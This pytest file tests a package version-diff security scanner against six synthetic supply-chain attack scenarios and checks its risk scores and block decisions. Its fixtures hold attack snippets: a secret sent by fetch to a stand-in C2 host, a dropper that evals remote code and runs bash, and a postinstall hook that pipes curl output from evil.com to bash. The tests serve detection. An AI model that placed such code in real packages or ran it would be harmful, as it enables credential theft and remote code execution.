import pytest
from app.services.version_diff.comparator import VersionComparator

# ==============================================================
# End-to-End Synthetic Attack Simulations (Scenarios A through F)
# ==============================================================

def test_scenario_a_benign_update():
    """
    Scenario A — Benign Update:
    - Normal utility functions.
    - Legitimate filesystem access (fs.readFile).
    - Legitimate outbound HTTP communication.
    - Ordinary refactoring.
    Expected: No automatic malicious classification; decision ALLOW.
    """
    comparator = VersionComparator()
    base_meta = {"version": "1.0.0"}
    target_meta = {"version": "1.1.0"}

    base_files = {
        "index.js": "const fs = require('fs');\nmodule.exports = { readConfig: () => fs.readFileSync('config.json') };\n"
    }
    target_files = {
        "index.js": "const fs = require('fs');\nconst http = require('http');\nmodule.exports = {\n  readConfig: () => fs.readFileSync('config.json'),\n  fetchHelp: () => http.get('http://api.example.com/help')\n};\n"
    }

    res = comparator.compare_versions(base_meta, target_meta, base_files, target_files)
    security = res["summary"]["security_analysis"]
    correlations = res["diff_details"]["correlations"]

    assert security["risk_score"] < 40.0
    assert security["policy_decision"] == "ALLOW"
    assert len(correlations) == 0


def test_scenario_b_credential_exfiltration():
    """
    Scenario B — Credential Exfiltration:
    - Access to sensitive environment variables.
    - Credential-related filesystem/token access.
    - Outbound network communication.
    Expected: Credential harvesting & exfiltration correlation triggered; decision BLOCK.
    """
    comparator = VersionComparator()
    base_meta = {"version": "1.0.0"}
    target_meta = {"version": "1.1.0"}

    base_files = {
        "index.js": "module.exports = () => 'safe';\n"
    }
    target_files = {
        "index.js": (
            "const key = 'AWS_SECRET_ACCESS_KEY';\n"
            "fetch('https://exfil-c2.xyz/steal?k=' + key);\n"
        )
    }

    res = comparator.compare_versions(base_meta, target_meta, base_files, target_files)
    security = res["summary"]["security_analysis"]
    correlations = res["diff_details"]["correlations"]

    assert any(c["pattern_type"] == "CREDENTIAL_HARVESTING_PIPELINE" for c in correlations)
    assert security["risk_score"] >= 60.0
    assert security["policy_decision"] in ["REVIEW", "BLOCK"]


def test_scenario_c_remote_dropper():
    """
    Scenario C — Remote Dropper:
    - Download-related network communication.
    - Process execution.
    - Dynamic code execution.
    Expected: Remote dropper correlation triggered; decision BLOCK.
    """
    comparator = VersionComparator()
    base_meta = {"version": "1.0.0"}
    target_meta = {"version": "1.1.0"}

    base_files = {"app.js": "console.log('init');\n"}
    target_files = {
        "app.js": (
            "const cp = require('child_process');\n"
            "fetch('https://c2.xyz/stage2').then(r => r.text()).then(code => {\n"
            "  eval(code);\n"
            "  cp.execSync('bash stage2.sh');\n"
            "});\n"
        )
    }

    res = comparator.compare_versions(base_meta, target_meta, base_files, target_files)
    security = res["summary"]["security_analysis"]
    correlations = res["diff_details"]["correlations"]

    assert any(c["pattern_type"] == "REMOTE_CODE_EXECUTION_DROPPER" for c in correlations)
    assert security["risk_score"] >= 70.0
    assert security["policy_decision"] == "BLOCK"


def test_scenario_d_suspicious_installation_hook():
    """
    Scenario D — Suspicious Installation Hook:
    - New postinstall lifecycle script.
    - Process execution.
    Expected: Install-time exploit correlation; decision BLOCK.
    """
    comparator = VersionComparator()
    base_meta = {"version": "1.0.0", "lifecycle_scripts": {}}
    target_meta = {
        "version": "1.1.0",
        "lifecycle_scripts": {"postinstall": "node setup.js"}
    }

    base_files = {"index.js": "module.exports = {};\n"}
    target_files = {
        "index.js": "module.exports = {};\n",
        "setup.js": "child_process.execSync('curl -s https://evil.com/setup | bash');\n"
    }

    res = comparator.compare_versions(base_meta, target_meta, base_files, target_files)
    security = res["summary"]["security_analysis"]
    correlations = res["diff_details"]["correlations"]

    assert any(c["pattern_type"] == "INSTALL_TIME_EXPLOIT_HOOK" for c in correlations)
    assert security["risk_score"] >= 60.0
    assert security["policy_decision"] in ["REVIEW", "BLOCK"]


def test_scenario_e_tampered_archive():
    """
    Scenario E — Tampered Archive:
    - Invalid or mismatched checksum.
    Expected: Integrity failure and BLOCK/REVIEW decision.
    """
    comparator = VersionComparator()
    # Risk calculation with integrity failure
    score, classification, decision, reasons, _ = comparator.risk_engine.calculate_risk(
        vulnerabilities=[],
        findings=[],
        metadata_findings=[],
        integrity_ok=False
    )
    assert score >= 50.0
    assert classification in ["HIGH", "CRITICAL"]
    assert decision in ["REVIEW", "BLOCK"]
    assert any("checksum mismatch" in r.lower() or "integrity" in r.lower() for r in reasons)


def test_scenario_f_preexisting_suspicious_behaviour():
    """
    Scenario F — Pre-existing Suspicious Behaviour:
    - Suspicious capability already present in the baseline version.
    - No new introduction in target version.
    Expected: Correct distinction between pre-existing and newly introduced behaviour.
    """
    comparator = VersionComparator()
    base_meta = {"version": "1.0.0"}
    target_meta = {"version": "1.1.0"}

    # Base already has eval
    base_files = {
        "eval_mod.js": "function compute(str) {\n  return eval(str);\n}\n"
    }
    # Target only touches unrelated comments/spacing
    target_files = {
        "eval_mod.js": "function compute(str) {\n  // comment\n  return eval(str);\n}\n"
    }

    res = comparator.compare_versions(base_meta, target_meta, base_files, target_files)
    diff = res["diff_details"]
    security = res["summary"]["security_analysis"]

    file_diff = diff["file_diffs"][0]
    assert len(file_diff["preexisting_findings"]) >= 1
    assert len(file_diff["new_findings"]) == 0
    assert security["total_new_findings"] == 0
